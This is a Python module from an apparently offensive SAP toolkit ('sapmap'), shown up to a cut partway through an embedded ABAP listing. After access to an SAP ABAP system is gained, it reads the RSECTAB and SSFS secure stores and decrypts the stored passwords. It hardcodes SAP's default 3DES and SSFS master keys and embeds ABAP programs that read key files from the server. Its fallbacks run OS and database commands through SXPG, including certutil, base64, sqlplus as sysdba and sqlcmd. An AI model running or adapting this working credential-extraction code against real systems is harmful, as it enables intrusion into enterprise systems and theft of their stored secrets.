"""
sapmap_secstore.py – SAP ABAP Secure Store (RSECTAB) reader and decryptor.

After gaining access to an SAP ABAP system, reads the RSECTAB table via
RFC_READ_TABLE and decrypts each row using the 3DES-based scheme described
in the ERPScan research "All your SAP passwords belong to us" (2014).

Algorithm (Python 3 port of the original Python 2.7 / pyDes implementation):

  Step 1 — decrypt ciphertext with default key (keydef)   → data_pass1
  Step 2 — extract SID and instance number from data_pass1
           derive keyprime = XOR keydef bytes with MD5(SID+instno) nibbles
  Step 3 — decrypt first 136 bytes of data_pass1 with keyprime → data_pass2
  Step 4 — extract password from data_pass2[2 : 2+pass_len]

The "triple-DES" is a manual 3-pass scheme (NOT standard EDE 3DES):
  pass 1: DES-CBC decrypt  with key[16:24]
  pass 2: DES-CBC encrypt  with key[8:16]
  pass 3: DES-CBC decrypt  with key[0:8]
  IV = 8 null bytes for every pass.

Requires pycryptodome:  pip install pycryptodome
"""

import datetime
import hashlib
import json
import os
import re
import traceback

try:
    from Crypto.Cipher import DES as _CryptoDES
    _HAVE_CRYPTO = True
except ImportError:
    _HAVE_CRYPTO = False

import sapmap_rfc
from sapmap_models import Credentials, RFCConnection
from sapmap_errors import format_rfc_exception

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Default 24-byte 3DES key hardcoded in SAP installations (all systems share
# this key unless the admin has configured an individual key).
DEFAULT_KEY_HEX = "b1e09244ec19eb3401dfc846ab225820c71bc376581eb3e4"

# Hardcoded KEK (Key Encryption Key) used to decrypt SSFS_<SID>.KEY files
# that use the encrypted format (187 bytes).  Embedded in all SAP rsecssfx
# binaries — same on every installation.
_SSFS_KEK_HEX = "9f60a6dd7e157d070cc357909aa290e9360eee472fda4772"

# RSECTAB.DATA is RAW(184) = 184 bytes = 368 hex chars
_DATA_LEN_BYTES = 184

# SSFS key file sizes
_SSFS_KEY_PLAIN_SIZE = 92    # SAPSSFSKey   — key at offset 12, 24 bytes
_SSFS_KEY_ENC_SIZE   = 187   # SAPSSFSKeyE  — encrypted key at offset 130, 57 bytes


# ---------------------------------------------------------------------------
# Internal crypto helpers
# ---------------------------------------------------------------------------

def _require_crypto():
    if not _HAVE_CRYPTO:
        raise RuntimeError(
            "pycryptodome is required for SecStore decryption. "
            "Install with:  pip install pycryptodome"
        )


def _des_ecb_encrypt(key8: bytes, block8: bytes) -> bytes:
    """Single DES ECB encrypt of one 8-byte block."""
    c = _CryptoDES.new(key8, _CryptoDES.MODE_ECB)
    return c.encrypt(block8)


def _des3_manual(key24: bytes, data: bytes) -> bytes:
    """
    RSECTAB decryption uses standard DES-CBC (NOT SAP's RSECCipher).
    Manual 3-pass: decrypt key[16:24], encrypt key[8:16], decrypt key[0:8].
    IV = 8 null bytes for each pass.
    """
    iv = b"\x00" * 8

    c1 = _CryptoDES.new(key24[16:24], _CryptoDES.MODE_CBC, iv)
    d = c1.decrypt(data)

    c2 = _CryptoDES.new(key24[8:16], _CryptoDES.MODE_CBC, iv)
    d = c2.encrypt(d)

    c3 = _CryptoDES.new(key24[:8], _CryptoDES.MODE_CBC, iv)
    d = c3.decrypt(d)
    return d


def _derive_keyprime(keydef: bytes, data_pass1: bytes) -> bytes:
    """
    Derive the per-system keyprime by XOR-ing specific bytes of keydef with
    nibbles of MD5(SID + instance_number) embedded at the end of data_pass1.
    Mirrors the keyprime[] array manipulation in the original Python 2.7 script.
    """
    sid    = data_pass1[-44:-41]   # 3 bytes
    instno = data_pass1[-41:-31]   # 10 bytes

    h = hashlib.md5()
    h.update(sid + instno)
    m = h.digest()                 # 16 bytes

    kp = bytearray(keydef)
    kp[1]  ^= m[0] & 0xF0
    kp[6]  ^= m[0] & 0x0F
    kp[7]  ^= m[3] & 0xF0
    kp[10] ^= m[1] & 0xF0
    kp[13] ^= m[1] & 0x0F
    kp[16] ^= m[4] & 0x0F
    kp[19] ^= m[2] & 0xF0
    kp[20] ^= m[2] & 0x0F
    return bytes(kp)


# ---------------------------------------------------------------------------
# SSFS key file extraction
# ---------------------------------------------------------------------------

def extract_ssfs_key(key_file_bytes: bytes) -> bytes:
    """Extract the 24-byte SSFS master key from a SSFS_<SID>.KEY file.

    Two formats exist:
      - Plaintext  (92 bytes):  key at offset 12, 24 raw bytes
      - Encrypted (187 bytes):  encrypted key at offset 130, 57 bytes,
                                 decrypted with the hardcoded KEK

    Returns the 24-byte key, or raises ValueError on failure.
    """
    _require_crypto()

    preamble = key_file_bytes[:11]
    if preamble != b"RSecSSFsKey":
        raise ValueError(
            f"Not an SSFS key file (preamble: {preamble!r}, expected b'RSecSSFsKey')"
        )

    size = len(key_file_bytes)

    # --- Plaintext format (92 bytes) ---
    if size == _SSFS_KEY_PLAIN_SIZE:
        key = key_file_bytes[12:36]
        if len(key) != 24:
            raise ValueError(f"Plaintext key truncated: {len(key)} bytes")
        print(f"[*] SSFS key file: plaintext format ({size} bytes)")
        return key

    # --- Encrypted format (187 bytes) ---
    if size == _SSFS_KEY_ENC_SIZE:
        return _decrypt_ssfs_key_enc(key_file_bytes)

    # Unknown size — try to detect
    if size > _SSFS_KEY_ENC_SIZE:
        print(f"[*] SSFS key file: oversized ({size} bytes), trying encrypted format")
        return _decrypt_ssfs_key_enc(key_file_bytes)

    raise ValueError(f"Unknown SSFS key file size: {size} bytes")


def _decrypt_ssfs_key_enc(key_file_bytes: bytes) -> bytes:
    """Decrypt the encrypted SSFS key using the hardcoded KEK.

    Uses SAP's RSECCipher (NOT standard DES) — the same proprietary cipher
    used for all SSFS operations.  The pysap rsec_decrypt_key function
    handles the 57-byte encrypted key blob including the partial-block
    CBC carry for the last byte.
    """
    from sap_rsec_cipher import rsec_decrypt_key
    key_enc = key_file_bytes[130:]
    if len(key_enc) < 57:
        raise ValueError(f"Encrypted key too short: {len(key_enc)} bytes (need 57)")

    key = rsec_decrypt_key(key_enc)
    if len(key) != 24:
        raise ValueError(f"Decrypted key wrong size: {len(key)} bytes (expected 24)")

    print(f"[*] SSFS key file: encrypted format ({len(key_file_bytes)} bytes), "
          f"decrypted to {len(key)}-byte key")
    return key


# ---------------------------------------------------------------------------
# SSFS DAT file parsing
# ---------------------------------------------------------------------------

def parse_ssfs_dat(dat_file_bytes: bytes, ssfs_key: bytes = None) -> list:
    """Parse an SSFS_<SID>.DAT file and return decrypted records.

    Record structure (from pysap SAPSSFS.py):
      Record header (24 bytes):
        bytes  0-11: preamble "RSecSSFsData"
        bytes 12-15: total record length (4 bytes, big-endian)
        byte  16:    type (1 = supported)
        bytes 17-23: filler
      Data header (152 bytes):
        bytes 24-87:   key_name / IDENT (64 bytes, space-padded)
        bytes 88-95:   timestamp
        bytes 96-119:  user (24 bytes)
        bytes 120-143: host (24 bytes)
        byte  144:     is_deleted
        byte  145:     is_stored_as_plaintext
        byte  146:     is_binary_data
        bytes 147-155: filler
        bytes 156-175: HMAC-SHA1 (20 bytes)
      Data payload (variable):
        bytes 176+:  encrypted data (length = total_length - 176)

    If ssfs_key is provided, each record's data payload is decrypted with it.
    Returns list of (ident, data_hex) tuples where data_hex is the encrypted
    (or decrypted) payload as hex.
    """
    _REC_PREAMBLE = b"RSecSSFsData"
    _REC_HEADER_LEN = 176
    _MIN_REC_SIZE = _REC_HEADER_LEN

    if len(dat_file_bytes) < 24:
        print(f"[-] SSFS DAT file too small: {len(dat_file_bytes)} bytes")
        return []

    records = []
    # Scan for record preambles — this is robust against unknown file headers
    pos = 0
    while pos + _MIN_REC_SIZE <= len(dat_file_bytes):
        # Find next record preamble
        idx = dat_file_bytes.find(_REC_PREAMBLE, pos)
        if idx < 0:
            break
        pos = idx

        if pos + _MIN_REC_SIZE > len(dat_file_bytes):
            break

        # Parse record length at offset 12 (4 bytes big-endian)
        rec_len = int.from_bytes(dat_file_bytes[pos + 12:pos + 16], "big")
        if rec_len < _REC_HEADER_LEN or rec_len > 0x18150:
            pos += 12  # skip this preamble occurrence, try next
            continue

        if pos + rec_len > len(dat_file_bytes):
            break

        # Record type at offset 16
        rec_type = dat_file_bytes[pos + 16]

        # Key name (IDENT) at offset 24, 64 bytes, space-padded
        ident_raw = dat_file_bytes[pos + 24:pos + 88]
        ident = ident_raw.rstrip(b" \x00").decode("ascii", errors="replace").strip()

        # Flags
        is_deleted    = dat_file_bytes[pos + 144]
        is_plaintext  = dat_file_bytes[pos + 145]

        # Data payload
        data_start = pos + _REC_HEADER_LEN
        data_len   = rec_len - _REC_HEADER_LEN
        data_bytes = dat_file_bytes[data_start:data_start + data_len]

        if ident and not is_deleted and data_len > 0:
            # Decrypt with SSFS key if provided and data is encrypted.
            # SSFS uses RSECCipher (NOT standard DES) for record encryption.
            if ssfs_key and not is_plaintext and data_len >= 8 and data_len % 8 == 0:
                try:
                    from sap_rsec_cipher import rsec_decrypt
                    data_bytes = rsec_decrypt(data_bytes, ssfs_key)
                except Exception:
                    pass  # leave as encrypted
            records.append((ident, data_bytes.hex().upper()))

        pos += rec_len  # advance to next record

    print(f"[*] SSFS DAT: parsed {len(records)} records from {len(dat_file_bytes)} bytes")
    return records


# ---------------------------------------------------------------------------
# ABAP program to read SSFS files from the OS filesystem
# ---------------------------------------------------------------------------

# Reads both KEY and DAT files via OPEN DATASET, base64-encodes them,
# and outputs in chunked lines that fit the WRITES ZEILE width limit.
# Uses SSFC_BASE64_ENCODE (classic FM syntax, works on all kernels).
# Tries two common SSFS paths: /usr/sap/<SID>/SYS/... and /sapmnt/<SID>/...
# Reads each file, base64-encodes it, and outputs in 200-char chunked lines.
_ABAP_READ_SSFS_FILES = [
    "REPORT ZSECSSFS LINE-SIZE 500.",
    "DATA FPATH TYPE STRING.",
    "DATA XSTR TYPE XSTRING.",
    "DATA B64 TYPE STRING.",
    "DATA CHUNK(200) TYPE C.",
    "DATA OFF TYPE I.",
    "DATA CLEN TYPE I.",
    "DATA REMAIN TYPE I.",
    "DATA SID3(3) TYPE C.",
    "DATA FOUND TYPE C.",
    "SID3 = SY-SYSID.",
    "* --- KEY file (try two paths) ---",
    "CLEAR FOUND.",
    "CONCATENATE '/usr/sap/' SID3",
    "  '/SYS/global/security/rsecssfs/key/SSFS_'",
    "  SID3 '.KEY' INTO FPATH.",
    "OPEN DATASET FPATH FOR INPUT IN BINARY MODE.",
    "IF SY-SUBRC <> 0.",
    "  CONCATENATE '/sapmnt/' SID3",
    "    '/global/security/rsecssfs/key/SSFS_'",
    "    SID3 '.KEY' INTO FPATH.",
    "  OPEN DATASET FPATH FOR INPUT IN BINARY MODE.",
    "ENDIF.",
    "IF SY-SUBRC = 0.",
    "  READ DATASET FPATH INTO XSTR.",
    "  CLOSE DATASET FPATH.",
    "  CALL FUNCTION 'SSFC_BASE64_ENCODE'",
    "    EXPORTING BINDATA = XSTR",
    "    IMPORTING B64DATA = B64",
    "    EXCEPTIONS OTHERS = 1.",
    "  IF SY-SUBRC = 0.",
    "    CLEN = STRLEN( B64 ).",
    "    WRITE: / '~~~KEYLEN', CLEN.",
    "    OFF = 0.",
    "    WHILE OFF < CLEN.",
    "      REMAIN = CLEN - OFF.",
    "      IF REMAIN > 200. REMAIN = 200. ENDIF.",
    "      CHUNK = B64+OFF(REMAIN).",
    "      WRITE: / '~~~K', CHUNK.",
    "      OFF = OFF + 200.",
    "    ENDWHILE.",
    "    FOUND = 'X'.",
    "  ENDIF.",
    "ENDIF.",
    "IF FOUND <> 'X'.",
    "  WRITE: / '~~~KEYERR NOTFOUND'.",
    "ENDIF.",
    "CLEAR XSTR. CLEAR B64.",
    "* --- DAT file (try two paths) ---",
    "CLEAR FOUND.",
    "CONCATENATE '/usr/sap/' SID3",
    "  '/SYS/global/security/rsecssfs/data/SSFS_'",
    "  SID3 '.DAT' INTO FPATH.",
    "OPEN DATASET FPATH FOR INPUT IN BINARY MODE.",
    "IF SY-SUBRC <> 0.",
    "  CONCATENATE '/sapmnt/' SID3",
    "    '/global/security/rsecssfs/data/SSFS_'",
    "    SID3 '.DAT' INTO FPATH.",
    "  OPEN DATASET FPATH FOR INPUT IN BINARY MODE.",
    "ENDIF.",
    "IF SY-SUBRC = 0.",
    "  READ DATASET FPATH INTO XSTR.",
    "  CLOSE DATASET FPATH.",
    "  CALL FUNCTION 'SSFC_BASE64_ENCODE'",
    "    EXPORTING BINDATA = XSTR",
    "    IMPORTING B64DATA = B64",
    "    EXCEPTIONS OTHERS = 1.",
    "  IF SY-SUBRC = 0.",
    "    CLEN = STRLEN( B64 ).",
    "    WRITE: / '~~~DATLEN', CLEN.",
    "    OFF = 0.",
    "    WHILE OFF < CLEN.",
    "      REMAIN = CLEN - OFF.",
    "      IF REMAIN > 200. REMAIN = 200. ENDIF.",
    "      CHUNK = B64+OFF(REMAIN).",
    "      WRITE: / '~~~D', CHUNK.",
    "      OFF = OFF + 200.",
    "    ENDWHILE.",
    "    FOUND = 'X'.",
    "  ENDIF.",
    "ENDIF.",
    "IF FOUND <> 'X'.",
    "  WRITE: / '~~~DATERR NOTFOUND'.",
    "ENDIF.",
]


def _read_ssfs_files_via_abap(node, creds,
                               soap_session=None) -> tuple:
    """Read SSFS KEY and DAT files from the SAP OS via RFC_ABAP_INSTALL_AND_RUN.

    Returns (key_bytes, dat_bytes) — either or both may be None if not available.

    Phase 3b: when ``soap_session`` is supplied, routes the ABAP
    OPEN DATASET program over SOAP-RFC instead of pyrfc → eliminates
    the 60s pyrfc-on-3340 timeout on firewalled HTTP-only targets.
    """
    import base64

    try:
        if soap_session is not None:
            res = soap_session.install_and_run(
                _ABAP_READ_SSFS_FILES, "ZSECSSFS")
        else:
            with sapmap_rfc._get_connection(node, creds) as conn:
                res = sapmap_rfc._run_abap_program(
                    conn, _ABAP_READ_SSFS_FILES, "ZSECSSFS")

        if not res.get("success"):
            client_label = creds.client if creds else "?"
            print(f"[-] {node.sid} client {client_label}: "
                  f"SSFS file read failed: {res.get('error')}")
            return None, None

        output = res.get("output", [])
        key_b64_parts = []
        dat_b64_parts = []

        for line in output:
            if line.startswith("~~~KEYERR"):
                err = line.split(None, 1)[1] if " " in line else line
                print(f"[*] SSFS KEY file not accessible: {err}")
            elif line.startswith("~~~KEYLEN"):
                klen = line.split(None, 1)[1].strip() if " " in line else "?"
                print(f"[*] SSFS KEY file: {klen} base64 chars")
            elif line.startswith("~~~K"):
                key_b64_parts.append(line[4:].strip())
            elif line.startswith("~~~DATERR"):
                err = line.split(None, 1)[1] if " " in line else line
                print(f"[*] SSFS DAT file not accessible: {err}")
            elif line.startswith("~~~DATLEN"):
                dlen = line.split(None, 1)[1].strip() if " " in line else "?"
                print(f"[*] SSFS DAT file: {dlen} base64 chars")
            elif line.startswith("~~~D"):
                dat_b64_parts.append(line[4:].strip())

        key_bytes = None
        dat_bytes = None

        if key_b64_parts:
            try:
                key_bytes = base64.b64decode("".join(key_b64_parts))
                print(f"[+] SSFS KEY: {len(key_bytes)} bytes read from OS")
            except Exception as e:
                print(f"[-] SSFS KEY base64 decode failed: {format_rfc_exception(e)}")

        if dat_b64_parts:
            try:
                dat_bytes = base64.b64decode("".join(dat_b64_parts))
                print(f"[+] SSFS DAT: {len(dat_bytes)} bytes read from OS")
            except Exception as e:
                print(f"[-] SSFS DAT base64 decode failed: {format_rfc_exception(e)}")

        return key_bytes, dat_bytes

    except Exception as e:
        print(f"[-] SSFS file read error: {format_rfc_exception(e)}")
        return None, None


def _read_ssfs_files_via_sxpg(node, creds, soap_route=None) -> tuple:
    """Read SSFS KEY and DAT files via SXPG OS commands (no ABAP exec needed).

    Fallback when RFC_ABAP_INSTALL_AND_RUN is blocked by SCC4.  Uses
    execute_local_command() which creates a loopback TCP/IP destination
    and calls SXPG_STEP_XPG_START to run base64-encoding OS commands.

    Windows: certutil -encode <file> <tmpfile> && type <tmpfile>
    Linux:   base64 <file>

    Phase 3b: when ``soap_route`` is supplied, routes the SXPG calls
    through execute_os_command (which dispatches to SOAP-RFC when the
    gateway port is unreachable) instead of raw pyrfc.  The
    create_tcpip_destination path that hangs on 3340 is bypassed
    entirely on HTTP-only targets.

    Returns (key_bytes, dat_bytes) — either or both may be None.
    """
    import base64

    sid = node.sid
    is_windows = (node.os_type or "").lower() in ("windows", "win", "nt")

    # SSFS file paths to try
    if is_windows:
        # Use SAP environment variables — they always point to the correct paths
        # regardless of drive letter (C:, P:, ...) or UNC share (\\host\sapmnt\...).
        # The variables RSEC_SSFS_KEYPATH / RSEC_SSFS_DATAPATH are set by SAP
        # at process startup.  cmd.exe expands them when certutil is invoked.
        key_paths = [
            f"%RSEC_SSFS_KEYPATH%\\SSFS_{sid}.KEY",
            # Fallback: classic C:\usr\sap layout (older SAP installations)
            f"C:\\usr\\sap\\{sid}\\SYS\\global\\security\\rsecssfs\\key\\SSFS_{sid}.KEY",
        ]
        dat_paths = [
            f"%RSEC_SSFS_DATAPATH%\\SSFS_{sid}.DAT",
            f"C:\\usr\\sap\\{sid}\\SYS\\global\\security\\rsecssfs\\data\\SSFS_{sid}.DAT",
        ]
        # %TEMP% is expanded by cmd.exe — works for any drive/path layout
        work_dir = "%TEMP%"
    else:
        key_paths = [
            f"/usr/sap/{sid}/SYS/global/security/rsecssfs/key/SSFS_{sid}.KEY",
            f"/sapmnt/{sid}/global/security/rsecssfs/key/SSFS_{sid}.KEY",
        ]
        dat_paths = [
            f"/usr/sap/{sid}/SYS/global/security/rsecssfs/data/SSFS_{sid}.DAT",
            f"/sapmnt/{sid}/global/security/rsecssfs/data/SSFS_{sid}.DAT",
        ]
        work_dir = None  # not needed for Linux

    def _read_file_via_sxpg(file_paths, label):
        """Read a single file via SXPG, trying multiple paths."""
        for fpath in file_paths:
            if is_windows:
                tmp = f"{work_dir}\\ssfs_tmp.b64"
                cmd = "cmd"
                params = f'/c certutil -encode "{fpath}" "{tmp}" && type "{tmp}" && del "{tmp}"'
            else:
                # Call base64 directly — do NOT wrap in /bin/sh -c "..."
                # because SXPG mangles inner quotes
                cmd = "base64"
                params = fpath

            # Route through execute_os_command — SOAP-RFC fallback
            # kicks in when soap_route is set AND gateway 33NN is
            # unreachable.  For non-firewalled targets this is the
            # same SXPG-via-pyrfc path execute_local_command was.
            import sapmap_exploit
            result = sapmap_exploit.execute_os_command(
                node, cmd, params, creds=creds,
                soap_route=soap_route, prefer="sxpg")
            if not result.get("success") or not result.get("output"):
                continue

            # Extract base64 from output
            b64_lines = []
            for line in result["output"]:
                clean = line.strip()
                if clean.startswith("-----"):
                    continue  # certutil header/footer
                if "CertUtil" in clean or "Input Length" in clean or "Output Length" in clean:
                    continue  # certutil status messages
                b64_chars = "".join(
                    c for c in clean
                    if c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
                )
                if b64_chars:
                    b64_lines.append(b64_chars)

            b64_str = "".join(b64_lines)
            if len(b64_str) < 10:
                continue

            try:
                raw = base64.b64decode(b64_str)
                if len(raw) > 0:
                    print(f"[+] {node.sid}: SSFS {label} read via SXPG: "
                          f"{len(raw)} bytes from {fpath}")
                    return raw
            except Exception:
                continue

        return None

    print(f"[*] {node.sid}: Reading SSFS files via SXPG (OS commands)...")
    key_bytes = _read_file_via_sxpg(key_paths, "KEY")
    dat_bytes = _read_file_via_sxpg(dat_paths, "DAT")

    if not key_bytes and not dat_bytes:
        print(f"[-] {node.sid}: SXPG could not read any SSFS files")

    return key_bytes, dat_bytes


def _read_rsectab_via_sxpg(node, creds) -> list | None:
    """Read RSECTAB via direct database query through SXPG OS commands.

    When RFC_ABAP_INSTALL_AND_RUN is blocked, uses execute_local_command()
    to run the database CLI (hdbsql, sqlcmd, sqlplus, db2) and query
    RSECTAB directly.  The SQL outputs IDENT and hex-encoded DATA per row
    with a ~~~ delimiter.

    Returns list of (ident, data_hex) tuples, or None if not possible.
    """
    db_type = (node.db_type or "").upper()
    if not db_type:
        print(f"[-] {node.sid}: Cannot read RSECTAB via SXPG — DB type unknown")
        return None

    sid = node.sid
    is_windows = (node.os_type or "").lower() in ("windows", "win", "nt")

    # Build a SQL SELECT that outputs IDENT~~~hex(DATA) per row.
    # The hex encoding is database-specific:
    #   HANA:    TO_VARCHAR(DATA, 'HEX')  or  BINTOHEX(DATA)
    #   MSSQL:   CONVERT(VARCHAR(MAX), DATA, 2)
    #   Oracle:  RAWTOHEX(DATA)
    #   MaxDB:   HEX(DATA)
    #   DB2:     HEX(DATA)
    db_key = db_type
    # SXPG splits params at spaces and mangles quotes.
    # Strategy: call the DB CLI directly as EXTPROG with minimal params.
    # Avoid double quotes in SQL — use single quotes only.

    # SXPG LOG MESSAGE field truncates at ~128 chars per line.
    # Strategy: run TWO queries — one for IDENT, one for hex(DATA).
    # Then merge by row index.  The hex DATA (368 chars) gets truncated
    # at 128 but we run a second query for the remaining part.

    def _hdb_query(sql):
        return sapmap_rfc.execute_local_command(
            node, "hdbsql", f"-U DEFAULT -x {sql}", creds)

    def _mss_query(sql):
        # Use named-instance dot-notation (.\\<SID>_DB) — same pattern as the GW
        # exploit.  TCP/1433 is typically disabled on SAP MSSQL named-instance
        # systems; shared-memory / named-pipes on .\\<SID>_DB always work locally.
        # Double-quote the SQL so sqlcmd -Q receives the full query as one argument.
        # Without quotes, sqlcmd -Q only tokenises on the first space-delimited word
        # ("SELECT") and silently discards the rest, producing a syntax error.
        mssql_server = f".\\{sid.upper()}_DB"
        return sapmap_rfc.execute_local_command(
            node, "sqlcmd", f'-S {mssql_server} -h -1 -W -Q "{sql}"', creds)

    def _ada_query(sql):
        return sapmap_rfc.execute_local_command(
            node, "sqlcli", f"-U DEFAULT {sql}", creds)

    def _ora_query(sql):
        return sapmap_rfc.execute_local_command(
            node, "sqlplus", f"-S / as sysdba @/dev/stdin <<< {sql}", creds)

    def _db2_query(sql):
        return sapmap_rfc.execute_local_command(
            node, "db2", sql, creds)

    # Pick the right query function and SQL dialect
    # 368 hex chars / 120 per chunk = 4 queries (ident + 3 hex chunks)
    chunk = 120  # fits within 128-char SXPG line limit

    if db_key in ("HDB", "HANA"):
        run_q = _hdb_query
        tbl = "RSECTAB"
        hex_fn = "BINTOHEX(DATA)"
        sub_fn = "SUBSTR"
    elif db_key == "MSS":
        run_q = _mss_query
        # 3-part name: [database].[schema].[table]
        # Schema is lowercase (dbs/mss/schema = sid.lower()) — case-sensitive collation
        tbl = f"[{sid.upper()}].[{sid.lower()}].[RSECTAB]"
        hex_fn = "CONVERT(VARCHAR(400),DATA,2)"
        sub_fn = "SUBSTRING"
    elif db_key in ("ORA", "ORACLE"):
        run_q = _ora_query
        tbl = "SAPSR3.RSECTAB"
        hex_fn = "RAWTOHEX(DATA)"
        sub_fn = "SUBSTR"
    elif db_key in ("ADA", "MAXDB", "ADABAS"):
        run_q = _ada_query
        tbl = "RSECTAB"
        hex_fn = "RAWTOHEX(DATA)"
        sub_fn = "SUBSTR"
    elif db_key in ("DB6", "DB2"):
        run_q = _db2_query
        tbl = "RSECTAB"
        hex_fn = "HEX(DATA)"
        sub_fn = "SUBSTR"

    else:
        print(f"[-] {node.sid}: Unsupported DB type for SXPG RSECTAB: {db_type}")
        return None

    # ORDER BY MANDT,IDENT ensures all 5 queries return rows in the same order
    # so the index-based merge (idents[i] ↔ hex_chunks[i]) is correct.
    # Without ORDER BY, the DB may return rows in any order (e.g. different
    # execution plans for each query), causing wrong ident↔data pairings.
    order_by = "ORDER BY MANDT,IDENT"

    sql_ident = f"SELECT IDENT FROM {tbl} {order_by}"
    # All chunks include an explicit length — SQL Server SUBSTRING() requires 3 args;
    # using chunk (120) for the last segment is safe: it returns whatever is left
    # (≤120 chars) without truncating, because SUBSTRING/SUBSTR silently stops
    # at the end of the string.  The total RSECTAB DATA hex is 368 chars
    # (184 bytes × 2), split into 120+120+120+8.
    sql_chunks = [
        f"SELECT {sub_fn}({hex_fn},1,{chunk}) FROM {tbl} {order_by}",
        f"SELECT {sub_fn}({hex_fn},{chunk+1},{chunk}) FROM {tbl} {order_by}",
        f"SELECT {sub_fn}({hex_fn},{chunk*2+1},{chunk}) FROM {tbl} {order_by}",
        f"SELECT {sub_fn}({hex_fn},{chunk*3+1},{chunk}) FROM {tbl} {order_by}",
    ]

    print(f"[*] {node.sid}: Reading RSECTAB via SXPG ({db_key} CLI)...")

    # Run queries: IDENT + hex chunks
    r_ident = run_q(sql_ident)
    if not r_ident.get("success"):
        print(f"[-] {node.sid}: SXPG RSECTAB IDENT query failed: "
              f"{r_ident.get('error', '')}")
        for line in r_ident.get("output", [])[:3]:
            print(f"    {line[:120]}")
        return None

    chunk_results = [run_q(sql) for sql in sql_chunks]

    # Parse output lines — strip header rows, quotes, pipes, whitespace
    def _clean_lines(result):
        lines = []
        for line in result.get("output", []):
            clean = line.strip().strip('"').strip("'")
            # Strip MaxDB/sqlcli pipe delimiters: | value |
            if clean.startswith("|") and clean.endswith("|"):
                clean = clean[1:-1].strip()
            elif clean.startswith("|"):
                clean = clean[1:].strip()
            # Skip header/separator lines
            if not clean or clean.startswith("---") or clean.startswith("==="):
                continue
            if clean.upper().startswith(("IDENT", "BINTOHEX", "SUBSTR",
                                         "RAWTOHEX", "HEX(", "CONVERT",
                                         "SUBSTRING", "EXPRESSION")):
                continue
            if clean.startswith("*") or "rows selected" in clean.lower():
                continue
            # sqlcmd (MSSQL) footer: "(400 rows affected)" — filter it
            if clean.startswith("(") and "rows affected" in clean.lower():
                continue
            lines.append(clean)
        return lines

    idents = _clean_lines(r_ident)
    chunk_lines = [_clean_lines(r) if r.get("success") else []
                   for r in chunk_results]

    # Merge by row index — concatenate hex chunks per row
    rows = []
    for i, ident in enumerate(idents):
        hex_parts = [cls[i].replace(" ", "").upper()
                     if i < len(cls) else ""
                     for cls in chunk_lines]
        data_hex = "".join(hex_parts)
        if ident and data_hex:
            rows.append((ident.strip(), data_hex))

    if rows:
        print(f"[+] {node.sid}: Read {len(rows)} RSECTAB entries via SXPG ({db_key})")
    else:
        print(f"[-] {node.sid}: SXPG RSECTAB query returned no parseable rows")
        for line in result.get("output", [])[:5]:
            print(f"    {line[:120]}")
        return None

    return rows


# ---------------------------------------------------------------------------
# Public decrypt function
# ---------------------------------------------------------------------------

def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
    """
    Decrypt one RSECTAB DATA value (hex string, 368 chars).

    Returns a dict:
      password      – decrypted password string  (None on failure)
      password_len  – declared length byte from the structure
      sid           – SID extracted from the decrypted structure
      instance_nr   – installation/instance number extracted
      error         – error message string, or None on success
    """
    result = {
        "password": None,
        "password_len": 0,
        "sid": "",
        "instance_nr": "",
        "error": None,
    }
    try:
        keydef = bytes.fromhex(key_hex)
        data   = bytes.fromhex(data_hex)

        # Data must be a multiple of 8 (DES block size) and at least 184 bytes
        # for RSECTAB.  SSFS records may differ in size.
        if len(data) < 136:
            result["error"] = (
                "DATA too short for decryption: %d bytes (need >= 136)"
                % len(data)
            )
            return result
        if len(data) % 8 != 0:
            # Pad to next 8-byte boundary with nulls
            data = data + b"\x00" * (8 - len(data) % 8)

        # Step 1: decrypt with default/supplied key
        data_pass1 = _des3_manual(keydef, data)

        # Check if stage 1 alone produced valid output (VERSION 3 / individual key).
        # VERSION 3 records have magic "RSEC" at offset 112-115 after just stage 1.
        magic_check = data_pass1[112:116]
        if magic_check == b"RSEC":
            # VERSION 3: single-stage decryption — password is already in data_pass1
            data_final = data_pass1
        else:
            # VERSION 2: two-stage decryption — derive keyprime and decrypt again
            keyprime = _derive_keyprime(keydef, data_pass1)
            data_final = _des3_manual(keyprime, data_pass1[:136])

        # Parse structure (same layout for both versions):
        #   data_final[0:2]    – prefix (2 bytes)
        #   data_final[2:111]  – password (up to 109 bytes)
        #   data_final[111]    – password length byte
        #   data_final[112:116] – magic "RSEC"
        #   data_pass1[140:143] – SID  (always from stage 1 output)
        #   data_pass1[143:153] – installation/instance number
        pass_len    = data_final[111]
        pass_bytes  = data_final[2:2 + min(pass_len, 109)]
        sid         = data_pass1[140:143].rstrip(b"\x00").decode("ascii", errors="replace").strip()
        inst_nr     = data_pass1[143:153].rstrip(b"\x00").decode("ascii", errors="replace").strip()

        result["password"]    = pass_bytes.decode("latin-1", errors="replace")
        result["password_len"] = pass_len
        result["sid"]         = sid
        result["instance_nr"] = inst_nr

    except Exception:
        result["error"] = traceback.format_exc(limit=2)

    return result


# ---------------------------------------------------------------------------
# ABAP program to read RSECTAB with proper hex encoding of the RAW field
# ---------------------------------------------------------------------------

# RFC_READ_TABLE cannot reliably handle RAW(184) fields: binary data may
# contain the pipe delimiter and break row parsing.  Instead we run a tiny
# ABAP report via RFC_ABAP_INSTALL_AND_RUN that reads RSECTAB, hex-encodes
# the DATA field, and writes one line per row as  IDENT~~~hex_DATA .
# Output per RSECTAB row uses 3 short lines to stay within the WRITES
# table ZEILE width limit (~256 chars in RFC_ABAP_INSTALL_AND_RUN):
#   ~~~I <MANDT> <IDENT>        (ident line)
#   ~~~A <first 184 hex chars>  (hex part 1: bytes 0-91)
#   ~~~B <rest 184 hex chars>   (hex part 2: bytes 92-183)
_ABAP_READ_RSECTAB = [
    "REPORT ZSECSTORE LINE-SIZE 500.",
    "TABLES: RSECTAB.",
    "DATA: HEXSTR(368) TYPE C.",
    "DATA: BYTE TYPE X LENGTH 1.",
    "DATA: HI TYPE I.",
    "DATA: LO TYPE I.",
    "DATA: BIDX TYPE I.",
    "DATA: HIDX TYPE I.",
    "DATA: CNT TYPE I.",
    "DATA: HC(16) TYPE C VALUE '0123456789ABCDEF'.",
    "SELECT * FROM RSECTAB CLIENT SPECIFIED.",
    "  CLEAR HEXSTR.",
    "  DO 184 TIMES.",
    "    BIDX = SY-INDEX - 1.",
    "    BYTE = RSECTAB-DATA+BIDX(1).",
    "    HI = BYTE DIV 16.",
    "    LO = BYTE MOD 16.",
    "    HIDX = BIDX * 2.",
